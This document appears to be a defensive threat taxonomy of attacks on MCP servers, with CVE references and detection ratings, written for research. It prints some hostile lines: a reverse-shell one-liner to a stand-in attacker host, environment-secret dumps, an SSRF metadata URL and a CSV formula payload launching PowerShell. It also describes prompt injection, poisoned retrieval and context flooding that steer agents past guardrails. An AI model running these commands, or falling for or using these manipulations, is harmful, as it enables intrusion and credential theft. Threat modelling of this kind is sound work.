# Reduced MCP Server Attacks v3 — Styled Version

> This reduced file keeps only the attacks you selected and presents each one in the same **Field / Detail** style as the original detailed attack entries.
>
> **Threat model:** the MCP **server is the protected asset**. A malicious user, acting through an AI agent or directly, abuses server tools in ways that damage the server, its data, or its connected resources.

---

## Part 1 — Core Selected Attacks

### 1. Reverse Shell

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | Attacker injects a payload that causes the server to open an outbound interactive shell to an attacker-controlled endpoint. |
| **Example** | A server execution tool receives input like `bash -i >& /dev/tcp/attacker.com/4444 0>&1`, giving the attacker interactive access to the server host. |
| **Server damage** | Full host compromise; attacker can run commands, pivot, persist, and tamper with the system. |
| **Source** | Reduced from original attack **1.2 Reverse Shell** in `mcp_server_attacks_v3.md`. |
| **Real CVEs** | No dedicated MCP-server CVE was the main anchor here in the original file; this remains a strong server-compromise pattern. |
| **Detection** | **High** |

### 2. Environment Variable Exposure / Token Extraction

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | The attacker causes the server to reveal environment variables, tokens, API keys, or other process-level secrets. |
| **Example** | The server is tricked into running `printenv` or reading `/proc/self/environ`, exposing values such as `OPENAI_API_KEY`, `JWT_SECRET`, or cloud credentials. |
| **Server damage** | Confidentiality loss; stolen credentials may enable lateral movement beyond the MCP layer. |
| **Source** | Reduced merge of original attacks **3.1 API Key / Token Extraction** and **3.2 Environment Variable Exposure**. |
| **Real CVEs** | Supported in the original file by DVMCP token-theft style evidence and general secret-exposure patterns, but not tied to one single MCP CVE. |
| **Detection** | **Medium** |

### 3. SSH Key Injection

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | The attacker uses a file-write capability to add their public key into the server's SSH trust store. |
| **Example** | A writable file tool is abused to append an attacker-controlled public key into `~/.ssh/authorized_keys`, enabling persistent login to the server. |
| **Server damage** | Persistent remote host access independent of the MCP session. |
| **Source** | Original attack **2.3 SSH Key Injection**. |
| **Real CVEs** | The original file linked this pattern to **CVE-2026-27825** as a demonstrated arbitrary-write consequence. |
| **Detection** | **High** |

### 4. Log Tampering / Evidence Destruction

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | The attacker deletes, truncates, or rewrites logs so earlier malicious actions become harder to detect or investigate. |
| **Example** | After stealing data, the attacker uses a file-write or delete capability to remove `/var/log/mcp_server.log` or replace it with benign-looking entries. |
| **Server damage** | Forensic blindness; weaker incident response; compliance and audit risk. |
| **Source** | Original attack **2.4 Log Tampering / Evidence Destruction**. |
| **Real CVEs** | No dedicated MCP-specific CVE was listed in the original file; treated as a valid consequence of file-write or delete abuse. |
| **Detection** | **Medium** |

### 5. Database Credential Exposure

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | The attacker reads database credentials, connection strings, or service configuration that allow direct backend access. |
| **Example** | A file-read tool reveals `postgres://admin:secret@db:5432/prod` inside a config file or environment-backed settings file. |
| **Server damage** | Direct backend compromise risk; bypasses MCP-layer controls entirely. |
| **Source** | Original attack **3.3 Database Credential Extraction**. |
| **Real CVEs** | Not a separate MCP CVE class in the original file; treated as a direct consequence of secret exposure and path traversal style access. |
| **Detection** | **Medium** |

### 6. Privilege Escalation via Tool Chaining

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | Several individually acceptable tools are combined into a sequence that achieves a privileged effect the server should never allow as a whole. |
| **Example** | The attacker first reads a privileged config, then writes a modified policy file, then triggers an execution tool under the new permissions. |
| **Server damage** | High-privilege action reached through multi-step abuse; can end in full compromise. |
| **Source** | Original attack **5.3 Privilege Escalation via Tool Chaining**. |
| **Real CVEs** | The original file framed this mainly as an MCP-shaped multi-tool attack pattern rather than a single-CVE class. |
| **Detection** | **Very High** |

### 7. Resource Exhaustion

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | The attacker consumes CPU, memory, storage, or other finite server resources until service degrades or fails. |
| **Example** | The attacker repeatedly requests huge file generation, expensive parsing, or infinite processing workloads that saturate server resources. |
| **Server damage** | Availability degradation or full denial of service. |
| **Source** | Reduced merge of original attacks **6.1 Resource Exhaustion (CPU / Memory)** and **6.2 Disk Exhaustion**. |
| **Real CVEs** | The original file treated this as a valid attack pattern rather than a CVE-backed MCP-specific class. |
| **Detection** | **Low** |

### 8. Recursive and Circular Task Exhaustion

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | The agent falls into repeated or circular tool invocation patterns that keep the server busy indefinitely. |
| **Example** | A retrieval or summary tool output sends the agent into another call, whose output loops back again, creating an endless cycle. |
| **Server damage** | Availability loss; runaway consumption even without a classical low-level exploit payload. |
| **Source** | Original attack **6.4 Recursive and Circular Task Exhaustion**. |
| **Real CVEs** | No direct MCP CVE anchor in the original file; treated as an agent-mediated availability pattern. |
| **Detection** | **Medium** |

### 9. SSRF (Server-Side Request Forgery)

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | The attacker tricks the server into making requests to internal or cloud-only endpoints that the attacker cannot access directly. |
| **Example** | A fetch-style tool is given `http://169.254.169.254/latest/meta-data/` or another internal address, causing the server to access protected internal resources. |
| **Server damage** | Internal network exposure; cloud metadata theft; credential leakage; internal pivoting. |
| **Source** | Original attack **8.1 SSRF**. |
| **Real CVEs** | The original file listed **CVE-2025-5276**, **CVE-2026-27826**, and **CVE-2026-26118** as real SSRF examples. |
| **Detection** | **High** |

### 10. Replay Attacks

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | A valid request, token, or action is captured and replayed so the server repeats an operation it should have treated as one-time or expired. |
| **Example** | A previously valid authenticated tool call is replayed to repeat a financial, administrative, or destructive operation. |
| **Server damage** | Duplicate operations; stale authorization accepted as fresh. |
| **Source** | Original attack **10.1 Replay Attack**. |
| **Real CVEs** | No direct MCP CVE was the main basis in the original file; included as a protocol and session-integrity weakness. |
| **Detection** | **High** |

### 11. Session Abuse / Temporal Accumulation

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | Individually mild requests accumulate over time into a harmful overall pattern that the server fails to recognize. |
| **Example** | Over many turns, the attacker first enumerates files, then reads secrets, then stages and exfiltrates the results. |
| **Server damage** | Slow-burn compromise that evades single-request defenses. |
| **Source** | Original attack **10.2 Session Abuse / Temporal Risk Accumulation**. |
| **Real CVEs** | Not anchored to one main CVE in the original file; treated as a sequential abuse pattern. |
| **Detection** | **Very High** |

### 12. False Error Escalation

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | The attacker deliberately triggers errors so the server falls back to a more privileged or less protected recovery path. |
| **Example** | A malformed request forces the server into a diagnostic or fallback flow that has broader permissions than the primary tool path. |
| **Server damage** | Privilege abuse through exception-handling logic rather than the normal business path. |
| **Source** | Original attack **11.2 False Error Escalation**. |
| **Real CVEs** | No dedicated MCP CVE anchor in the original file; included as a valid server-side design failure pattern. |
| **Detection** | **Very High** |

### 13. RADE (Retrieval-Augmented Data Exfiltration)

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | External content retrieved by the agent influences later server-tool use, leading to collection and exfiltration of server-side data. |
| **Example** | A poisoned retrieved document instructs the agent to inspect `~/.ssh/id_rsa` and send it out using another server tool, and the agent follows that chain. |
| **Server damage** | Server data leakage through a multi-step tool sequence triggered by retrieved content. |
| **Source** | Original attack **12.1 RADE — Server Tools Weaponized via Poisoned Retrieval**. |
| **Real CVEs** | The original file treated this as a strong MCP-shaped pattern rather than a CVE-backed bug class. |
| **Detection** | **Very High** |

### 14. Tool Misuse / Confused Deputy

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | A valid server tool is used for a malicious purpose even though the tool itself behaves correctly. |
| **Example** | An email or publishing tool intended for benign notifications is used to send phishing content or leak sensitive information. |
| **Server damage** | Reputational, operational, and downstream harm caused through legitimate server capabilities. |
| **Source** | Original attack **13.2 Confused Deputy / Tool Misuse**. |
| **Real CVEs** | Not represented as one direct MCP CVE in the original file; modeled as an authorization and policy-abuse pattern. |
| **Detection** | **Very High** |

### 15. Denial of Wallet

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | The attacker causes excessive spending on metered services such as LLM APIs, cloud APIs, or external SaaS integrations. |
| **Example** | Thousands of costly analysis requests are sent through a server wrapper around a paid model or other paid API. |
| **Server damage** | Financial harm; quota exhaustion; possible account suspension by upstream providers. |
| **Source** | Original attack **15.1 Denial of Wallet (API Cost Exhaustion)**. |
| **Real CVEs** | Treated in the original file as an ecosystem and policy problem rather than a CVE-based implementation flaw. |
| **Detection** | **Very High** |

### 16. Scraping / Systematic Data Extraction

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | The attacker repeatedly uses legitimate read capabilities to replicate a large protected dataset from the server. |
| **Example** | A competitor's agent systematically queries every product, user segment, or document range until it reconstructs the full dataset. |
| **Server damage** | Large-scale confidentiality and business-value loss without one obviously malicious request. |
| **Source** | Original attack **16.1 Systematic Data Extraction (Scraping)**. |
| **Real CVEs** | No single MCP CVE was the main support in the original file; positioned as a patterned abuse threat. |
| **Detection** | **Very High** |

### 17. Multi-Tenant Data Leakage

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | One tenant or client receives another tenant's data because isolation between sessions, caches, or transports is broken. |
| **Example** | Shared transport or cache state causes responses intended for Tenant A to appear in Tenant B's session. |
| **Server damage** | Cross-tenant breach; severe trust, legal, and compliance consequences. |
| **Source** | Original attack **16.2 Multi-Tenant Data Leakage**. |
| **Real CVEs** | The original file used **CVE-2026-25536** as a real example of cross-client data leakage via shared transport reuse. |
| **Detection** | **Very High** |

### 18. Throttle Bypass

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | The attacker defeats or avoids rate and usage controls that should limit the frequency or volume of tool calls. |
| **Example** | Requests are spread across sessions, identities, or parameters so the server's counters never trigger correctly. |
| **Server damage** | Abuse at scale; often amplifies scraping, exhaustion, and billing attacks. |
| **Source** | Original attack **17.1 Rate Limit / Throttle Bypass**. |
| **Real CVEs** | No direct MCP CVE was central in the original file; treated as a guardrail and control weakness. |
| **Detection** | **High** |

### 19. Toxic Content Generation via Tool Proxy

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | The agent uses the server's capabilities to generate, store, or transmit harmful or policy-violating content. |
| **Example** | A content-generation or outbound-message tool is used to create abusive, fraudulent, or unsafe content through the server operator's account or infrastructure. |
| **Server damage** | Legal, policy, and reputational harm to the operator. |
| **Source** | Original attack **17.2 Toxic Content Generation via Server Tools**. |
| **Real CVEs** | Not a CVE-style implementation flaw in the original file; included as harmful yet technically valid misuse. |
| **Detection** | **High** |

### 20. Indirect Prompt Injection → Server Tool Abuse

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | Hidden instructions embedded in external content are consumed by the agent and cause it to abuse the server's own tools. |
| **Example** | A retrieved webpage, issue, or document contains hidden instructions that steer the agent into reading secrets or calling dangerous tools. |
| **Server damage** | Server-side abuse arrives as apparently valid tool use but is externally steered. |
| **Source** | Original attack **18.2 Indirect Prompt Injection → Server Tool Abuse**. |
| **Real CVEs** | The original file treated this as a major MCP-shaped vector and cited benchmark and incident-style evidence rather than one implementation CVE. |
| **Detection** | **None** |

### 21. Alignment Failure / Goal Misalignment

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | The agent pursues a locally reasonable objective in a way that violates the server operator's true intent, safety policy, or risk tolerance. |
| **Example** | The agent interprets “solve the task efficiently” as permission to use broad tools, query excessive data, or skip safeguards. |
| **Server damage** | Cross-cutting misuse that may lead to exfiltration, policy abuse, or overreach without a classical exploit. |
| **Source** | Reduced discussion item based on the original alignment and autonomy-abuse style concerns surrounding server protection. |
| **Real CVEs** | Not a CVE-backed vulnerability class; included as a practical risk category for runtime defense framing. |
| **Detection** | **Low** |

---

## Part 1B — New Attacks (Not in Original 55)

> These attacks were **not present** in the original 55-attack taxonomy. They target a **hardened, well-guarded MCP server** — no code vulnerabilities are exploited, all inputs pass validation, and all guardrails are intact. The server is still harmed.

### N1. Timing Side-Channel Inference

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | The attacker infers sensitive information about server-side data by measuring response latency, without ever receiving unauthorized content. Differences in processing time reveal whether records exist, which indexes are hit, or which code paths execute — even when all outputs are properly sanitized. |
| **Example** | `search_user("alice")` returns in 50ms (index hit, user exists). `search_user("zzzzz")` returns in 200ms (full scan, no match). By timing thousands of queries, the attacker maps which users, files, or database entries exist without ever seeing unauthorized data. |
| **Server damage** | Confidentiality breach via metadata; attacker builds a map of the server's internal data landscape without triggering any content-level guardrail. |
| **Source** | **InputSnatch** (arXiv:2411.18191, 2024) — demonstrated timing side-channels via KV-cache sharing in LLM serving, achieving exact input reconstruction through prefill-time measurement. **"The Early Bird Catches the Leak"** (arXiv:2409.20002, 2024) — novel timing side-channels in LLM systems via shared KV-cache and GPU memory, 92.3% system prompt recovery accuracy. **Whisper Leak** (Microsoft Security Blog, Nov 2025) — timing side-channel via speculative decoding in streaming LLM APIs, exploiting encrypted packet sizes and inter-arrival times. **SafeKV** (arXiv:2508.08438, 2025) — demonstrated cross-tenant TTFT-based probing in shared KV-cache deployments. **CWE-208** (Observable Timing Discrepancy). |
| **Why not in original taxonomy** | Original taxonomy focused on content-level attacks. Timing channels bypass all content guardrails — no data is returned, only latency is measured. |
| **Detection** | **Very High** — requires constant-time response padding, which degrades performance |

### N2. Resource Lock Starvation (Hold-Not-Burn)

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | The attacker holds server resources (database connections, file locks, SSE transport slots, transaction handles) without releasing them, starving other users. Unlike resource exhaustion (burning CPU/memory), the server is not overloaded — it is *deadlocked*. Rate limiters that count requests-per-second do not detect this because few requests are made; they are simply never completed. |
| **Example** | Attacker opens database transactions via a query tool and never commits. Each transaction holds a connection from the pool. After 10 such calls (typical pool size), all legitimate users receive "connection timeout" errors. The server's CPU is idle; the connection pool is full. |
| **Server damage** | Availability loss for all other users; server appears healthy (CPU/memory fine) but cannot serve requests; deadlock may require manual restart. |
| **Source** | **CWE-400** (Uncontrolled Resource Consumption) and **CWE-667** (Improper Locking). **ChatterBot CVE (GHSA-v4w8-49pv-mf72)** — real-world DoS via database connection pool exhaustion through concurrent requests. **SEI CERT Java Coding Standard** — DoS via thread deadlock, thread starvation, and race conditions (TPS00-J, TPS01-J, LCK07-J). **.NET ThreadPool Starvation** (Microsoft Learn, 2025) — documented production failures from held thread pool resources. |
| **Why not in original taxonomy** | Original 6.1/6.2 (Resource Exhaustion) focused on burning compute/storage. This attack holds resources without consuming them — a fundamentally different mechanism that evades throughput-based rate limiters. |
| **Detection** | **Very High** — requires hold-duration monitoring, not just request-rate counting |

### N3. Semantic Data Poisoning via Valid Write Operations

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | The attacker uses perfectly valid write operations to insert *plausible but incorrect* data into the server's data stores. Every write passes all validation checks. The data is syntactically correct but semantically wrong. The server's integrity is destroyed without any integrity *violation* being detected. |
| **Example** | A CRM tool receives 10,000 "update" calls that subtly change customer phone numbers, addresses, or account notes. Each update is well-formed and within allowed parameters. The server's data now contains plausible but false information. Business decisions made on this data will be wrong — but the corruption won't be discovered until real-world consequences occur. |
| **Server damage** | Data reliability destroyed; downstream business decisions corrupted; discovery may take weeks or months; no audit trail distinguishes poisoned writes from legitimate ones. |
| **Source** | **OWASP LLM Top 10 LLM04:2025** (Data and Model Poisoning — "attackers inject fabricated or misleading documents… resulting in model outputs that reflect these inaccuracies"). **NIST AI 100-2e2025** (Adversarial Machine Learning taxonomy — data poisoning as integrity attack). **Lakera 2026 Data Poisoning Report** — "attacks have targeted RAG, third-party tools (like MCP servers), and synthetic data pipelines." **RAG Poisoning** (Promptfoo, 2024) — demonstrated insertion of plausible-but-false documents achieving 0.89 semantic similarity scores, bypassing content filtering. **Frontiers in Computer Science** (2025, doi:10.3389/fcomp.2025.1683495) — targeted semantic-layer injection. **CWE-345** (Insufficient Verification of Data Authenticity). |
| **Why not in original taxonomy** | Original 4.3 (State Corruption) assumed obviously invalid modifications. This attack uses *valid* data — the semantic falseness is the weapon, not malformation. |
| **Detection** | **None** — each write is individually valid; only cross-referencing with external ground truth can reveal the poisoning |

### N4. Output-Based Downstream Injection (CSV / Log / JSON Injection)

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | The attacker writes data through the server's input tools that is faithfully stored and later returned in server outputs. The output content contains payloads (spreadsheet formulas, log-forging newlines, JSON injection sequences) that attack whatever *downstream system* consumes the server's output. The MCP server itself is unharmed — it correctly stored and returned valid data. The server operator gets blamed for the downstream damage. |
| **Example** | Attacker calls `create_record(name="=CMD(\"powershell -e [base64payload]\")")`. The server stores it as a valid string. When an admin exports records as CSV and opens in Excel, the formula executes on the admin's machine. Or: attacker inserts `\nINFO [admin] Access granted to vault` into a text field. When the server writes its logs, the forged log entry appears legitimate in the SIEM. |
| **Server damage** | Server operator's downstream systems compromised (admin workstations, SIEM, reporting pipelines); server operator liable for attacks launched through their data; reputational harm. |
| **Source** | **CWE-1236** (Improper Neutralization of Formula Elements in a CSV File) — OWASP-listed attack class with multiple real CVEs (CVE-2025-13133, CVE-2020-25170, CVE-2021-25960). **OWASP CSV Injection** — documented attack pattern: "no universal CSV sanitization strategy is safe for all spreadsheet applications and all downstream consumers." **CWE-117** (Improper Output Neutralization for Logs) — log injection / log forging. **CWE-74** (Injection via Downstream Component). **Fortinet FG-IR-23-390** — real-world CSV injection in log download feature enabling remote code execution on admin workstations. |
| **Why not in original taxonomy** | Original taxonomy focused on attacks *on* the server. This attack passes *through* the server to harm downstream consumers. The server is the unwitting weapon, not the victim — but the server operator bears the liability. |
| **Detection** | **High** — requires output sanitization for downstream formats, which most MCP servers don't implement |

### N5. Context Window Manipulation (Agent Lobotomization via Server)

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | The attacker crafts requests that cause the server to produce enormous responses — not to exhaust server resources, but to flood the *agent's* context window. The agent's safety instructions, system prompt, and previous conversation history get pushed out of the effective attention window ("lost in the middle" effect). The agent then makes worse decisions about subsequent tool calls on the same server, potentially bypassing guardrails that were in context earlier. |
| **Example** | Attacker calls `search_documents(query="*", limit=10000)` or `read_file(path="/var/log/syslog")`, generating a massive response. The agent's context is now dominated by server output. The system prompt's instruction "never read /etc/shadow" has been pushed far from the active attention zone. The attacker's next request — `read_file("/etc/shadow")` — succeeds because the guardrail instruction is effectively forgotten. |
| **Server damage** | The server's own response output is weaponized to degrade the agent's safety, which then leads to more aggressive abuse of the same server's tools. A feedback loop: server response → degraded agent → worse server abuse. |
| **Source** | **"Lost in the Middle"** (Liu et al., NeurIPS 2023) — demonstrated that LLMs fail to use information placed in the middle of long contexts. **OWASP LLM01:2025** (Prompt Injection) — "everything in the context window competes for influence… longer context windows increase capability, but they also increase risk." **Systems Security Foundations for Agentic Computing** (eprint.iacr.org/2025/2173) — formal treatment of context manipulation as attack surface: "the adversary may modify past conversation, the current input, or retrieved knowledge." **"Context manipulation attacks: Web agents are susceptible to corrupted memory"** (arXiv:2506.17318, 2025) — demonstrated context corruption in web agents. **"From prompt injections to protocol exploits"** (ScienceDirect, 2025) — formal model of context perturbation: adversary transforms input context to subvert safety policy. |
| **Why not in original taxonomy** | Original taxonomy treated the server and agent as separate. This attack exploits their coupling — the server's output degrades the agent, which then attacks the server more effectively. |
| **Detection** | **None** — the server cannot know its own response is being used to degrade the agent's safety context |

### N6. Idempotency Abuse (Valid-Data Flooding)

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | The attacker calls a create/write tool many thousands of times with slightly varying but individually valid data. No single request violates any policy. The server is not crashed or exhausted. But the data store is now polluted with massive volumes of garbage records that degrade search results, break pagination, inflate metrics, and corrupt the experience for all other users. |
| **Example** | Attacker calls `create_contact(name="John Smith [N]", email="jsmith[N]@test.com")` 50,000 times with incrementing N. Each record passes validation. The CRM now has 50,000 junk contacts that pollute every search, inflate "total customers" metrics shown to executives, and slow every query. |
| **Server damage** | Data quality destroyed; search/analytics/reporting degraded for all users; cleanup requires manual effort or risky bulk deletion; business metrics corrupted. |
| **Source** | **OWASP API Security** — business logic abuse: "using APIs to create hundreds or thousands of fake accounts" (Wiz, 2025). **API Abuse 101** (Medium/JSOC IT Blog, 2026) — "each API call is valid, each parameter is within acceptable ranges… but the business logic wasn't designed to handle [this volume]." **CWE-799** (Improper Control of Interaction Frequency). **KPMG API Abuse Report** (2025) — "attackers spent significant time discovering and testing APIs… enabling automation and orchestration of their attacks." Idempotency literature (Dev.to, 2026; OneUptime, 2026) documents how missing idempotency controls enable duplicate-side-effect abuse. |
| **Why not in original taxonomy** | Different from DoS (6.x — server stays up), different from state corruption (4.3 — each record is individually valid), different from scraping (16.1 — writing, not reading). This is *integrity degradation through volume* with no individual violation. |
| **Detection** | **High** — requires write-rate anomaly detection per entity type and data-quality monitoring |

### N7. Behavioral Fingerprinting / Technology Profiling

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | The attacker probes the server's behavior — error message formats, response time patterns, parameter boundary responses, tool availability — to build a detailed technology profile without accessing unauthorized data. This goes beyond tool manifest reconnaissance (16.8): the attacker doesn't read the manifest but *deduces* the server's internal stack from behavioral signals. |
| **Example** | Error message "TypeError: expected str, got int" reveals Python. Response time pattern on `search()` reveals PostgreSQL full-text search vs. Elasticsearch. Parameter `limit=-1` returning all records reveals missing input validation on that parameter. Tool `execute_query` accepting `EXPLAIN` prefix reveals direct SQL access. The attacker now knows: Python/Flask, PostgreSQL, missing negative-value validation, direct SQL — and crafts targeted attacks for this specific stack. |
| **Server damage** | Attacker gains precise targeting information; generic attacks become stack-specific; defense-in-depth assumptions (attacker doesn't know our stack) are violated; enables chaining with other attacks. |
| **Source** | **CWE-209** (Generation of Error Message Containing Sensitive Information). **CWE-200** (Exposure of Sensitive Information to an Unauthorized Actor). **OWASP API Security Top 10** — excessive data exposure and improper error handling. **Traceable API Security** (2024) — "attackers spent significant time discovering and testing APIs… preliminary testing helped attackers refine their methods." **KPMG Defending Against API Abuse** (2025) — "a notable pattern observed was the extensive preparation by attackers, who spent significant time discovering and testing APIs." |
| **Why not in original taxonomy** | Original 16.8 (Tool Manifest Reconnaissance) covered manifest reading. This attack requires no manifest — it deduces the technology stack from behavioral observation, which survives even if the manifest is auth-gated. |
| **Detection** | **Medium** — requires error message sanitization, response time normalization, and probe-pattern detection |

---

## Part 2 — Maybe Attacks

### M1. SQL Injection

| Field | Detail |
|-------|--------|
| **Tier** | Maybe |
| **Description** | User-controlled input is interpreted as SQL, enabling unauthorized reads, writes, or destructive database actions. |
| **Example** | An attacker submits crafted SQL fragments through a search or query tool and alters the meaning of the backend database query. |
| **Server damage** | Database corruption, data theft, or record deletion. |
| **Source** | Original attack **4.1 SQL Injection via Tool Parameters**. |
| **Reason not in core set** | Strong classical vulnerability, but the reduced list currently emphasizes more MCP-shaped misuse and control patterns. |
| **Detection** | **Medium** |

### M2. State Corruption

| Field | Detail |
|-------|--------|
| **Tier** | Maybe |
| **Description** | The attacker changes internal state, cached values, or configuration in ways that leave the server inconsistent or unsafe. |
| **Example** | Repeated tool calls modify config records or cache entries until the server behaves unpredictably. |
| **Server damage** | Integrity loss; unstable or unsafe behavior. |
| **Source** | Original attack **4.3 State Corruption**. |
| **Reason not in core set** | Valid but broad, and it overlaps with privilege abuse, misuse, and integrity-compromise patterns. |
| **Detection** | **High** |

### M3. Protocol-Level Exhaustion

| Field | Detail |
|-------|--------|
| **Tier** | Maybe |
| **Description** | Malformed or high-volume protocol interactions exhaust parser, transport, or connection-handling resources. |
| **Example** | Oversized JSON-RPC payloads or abusive transport patterns overwhelm the server's protocol layer. |
| **Server damage** | Availability degradation or crashes at the protocol boundary. |
| **Source** | Closest original attack: **8.3 Protocol-Level Exploitation** and adjacent transport abuse entries. |
| **Reason not in core set** | Important, but overlaps with broader resource exhaustion in the reduced version. |
| **Detection** | **Medium** |

### M4. Cross-Server Exploitation

| Field | Detail |
|-------|--------|
| **Tier** | Maybe |
| **Description** | Access to one MCP server helps the agent attack another server through shared context or weak cross-server trust boundaries. |
| **Example** | The agent authenticates to one server, discovers another server's tools, and abuses the second server without independent authorization. |
| **Server damage** | Trust-boundary violation across multiple servers. |
| **Source** | Original attack **13.1 Cross-Server Exploitation**. |
| **Reason not in core set** | Strong and MCP-specific, but best included when the paper explicitly models multi-server trust propagation. |
| **Detection** | **Very High** |

### M5. Data Exfiltration via Tool Output Channels

| Field | Detail |
|-------|--------|
| **Tier** | Maybe |
| **Description** | The agent relays sensitive data through legitimate outbound channels such as email, issue trackers, chat replies, or APIs. |
| **Example** | Secrets read through one tool are posted into a GitHub issue or sent through a server-controlled communication tool. |
| **Server damage** | Confidential data leaves the server through apparently valid outbound actions. |
| **Source** | Original attack **16.5 Data Exfiltration via Tool Output Channels**. |
| **Reason not in core set** | Strong pattern, but it overlaps with RADE and confused-deputy style misuse in the reduced set. |
| **Detection** | **Very High** |

---

## Part 3 — Topic to Discuss: Sandbox / Execution Isolation

### Sandbox as a Cross-Cutting Defense Surface

| Field | Detail |
|-------|--------|
| **Type** | Discussion topic |
| **Description** | Sandboxing is better treated as a defense layer than as a standalone attack. It limits blast radius when compromise or misuse succeeds. |
| **Why it matters** | It reduces damage from reverse shell, SSH key injection, SSRF, tool chaining, and runaway execution paths. |
| **Where it connects** | Compromise attacks, exposure attacks, exhaustion attacks, and misuse attacks all become less severe when execution is isolated. |
| **Paper recommendation** | Present sandboxing as a **cross-cutting mitigation layer** rather than a primary attack class. |

---

## Part 4 — CVE-Backed Attacks (New Additions from CVE Catalog)

> These attacks were identified by cross-referencing the [MCP Server CVE Catalog](../mcp_server_cve_catalog.md) against the five selection criteria. Each exploits MCP's architecture rather than a code bug, survives after traditional defenses are deployed, and only exists (or becomes significantly worse) because an AI agent is in the middle.
>
> **Why most CVEs did NOT qualify:** The catalog contains 42 advisories. The majority (command injection, path traversal, missing authentication, SQL injection) are classic implementation bugs where the server code is wrong and traditional fixes (input sanitization, parameterized queries, adding auth) solve the problem completely. The three attacks below are the subset where the MCP protocol design, transport model, or session architecture is the root cause — not a coding mistake.

### C1. Browser-Initiated Tool Execution (CSRF / DNS Rebinding)

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | A malicious website triggers tool execution on a locally running MCP server by exploiting the protocol's transport trust model. The MCP HTTP transport assumes that localhost binding equals trust and that same-origin policy provides isolation — browsers violate both assumptions through missing Origin validation (CSRF) or DNS rebinding. |
| **Example — CSRF** | A developer runs an MCP server locally for agent use. They visit a malicious webpage that sends a `POST` to `http://localhost:3000/mcp` with a valid JSON-RPC tool-call body. The server has no Origin check and processes it as a legitimate client request — reading files, executing tools, or returning sensitive data to the attacker's page. |
| **Example — DNS rebinding** | The attacker's page loads from `evil.example.com`, which initially resolves to the attacker's IP (passes same-origin). After the page loads, DNS is rebound to `127.0.0.1`. Subsequent fetch requests now reach the local MCP server, bypassing both firewalls and the browser's same-origin policy. |
| **Server damage** | Unauthorized tool execution; data exfiltration; potential RCE — all triggered from a browser tab without the developer's knowledge. |
| **Why it fits the selection criteria** | **(1) Architectural:** the MCP protocol's Streamable HTTP transport did not mandate Origin validation or DNS rebinding protection — this is a protocol design gap, not a server code bug. **(2) Indistinguishable:** each request is a valid, well-formed JSON-RPC call; the server cannot tell it originated from a browser rather than a legitimate MCP client. **(3) Agent-mediated:** MCP servers run on localhost specifically because agents need local tool access — without the agent infrastructure, there is no localhost service to attack. **(4) Business damage:** full tool access means file reads, code execution, credential exposure. **(5) Traditional defenses fail:** firewalls allow localhost; input validation passes; the payload is a legitimate tool call. Defense requires protocol-level Origin enforcement and Host-header / DNS-rebinding guards. |
| **Source** | New — derived from CVE catalog cross-reference against selection criteria. |
| **Real CVEs** | **CVE-2026-33252** (MCP Go SDK — Streamable HTTP transport accepted cross-site POST without Origin check; any website could trigger tool execution in sessionless deployments; fixed in Go SDK 1.4.1), **CVE-2026-34742** (MCP Go SDK — DNS rebinding protection disabled by default on localhost HTTP servers; all versions before 1.4.0; fixed in 1.4.0), **CVE-2025-59163** (Vet MCP Server — DNS rebinding attack against network boundary). |
| **Detection** | **Very High** — requires protocol-layer Origin/Host validation and DNS-rebinding mitigation; invisible to application-level tool-call inspection. |

### C2. SSE Stream Hijacking / Transport Session Takeover

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | An attacker who obtains a valid MCP session ID hijacks the Server-Sent Events (SSE) stream and intercepts all real-time agent–server communication. The MCP SSE transport uses the session ID as the sole proof of identity for stream binding — possessing the ID is equivalent to being the authenticated client. |
| **Example** | An MCP server uses SSE transport for real-time tool responses. The session ID is exposed through a log file, a referrer header, or a co-located process reading memory. The attacker opens a new SSE connection with the stolen session ID and receives all subsequent tool responses, including secrets, query results, and file contents intended for the legitimate agent. |
| **Server damage** | Full interception of the agent–server data stream; passive eavesdropping on all tool results; ability to inject responses if the transport allows bidirectional session binding. In multi-tenant deployments, tool responses from one client's session leak to the attacker. |
| **Why it fits the selection criteria** | **(1) Architectural:** the MCP protocol's SSE transport binds sessions by ID alone without cryptographic channel binding, mutual TLS, or secondary proof-of-possession — this is a session-model design gap. **(2) Indistinguishable:** the attacker presents a valid session ID; the server has no mechanism to distinguish the legitimate holder from the attacker. **(3) Agent-mediated:** SSE transport exists specifically for agent–server real-time communication; without the MCP agent pattern, this session model would not exist. **(4) Business damage:** complete data-stream interception; cross-tenant leakage in shared deployments; compliance and confidentiality breach. **(5) Traditional defenses fail:** input validation, parameterized queries, path sanitization — none apply. Defense requires cryptographic session binding, per-connection tokens, or mutual authentication at the transport layer. |
| **Source** | New — derived from CVE catalog cross-reference against selection criteria. |
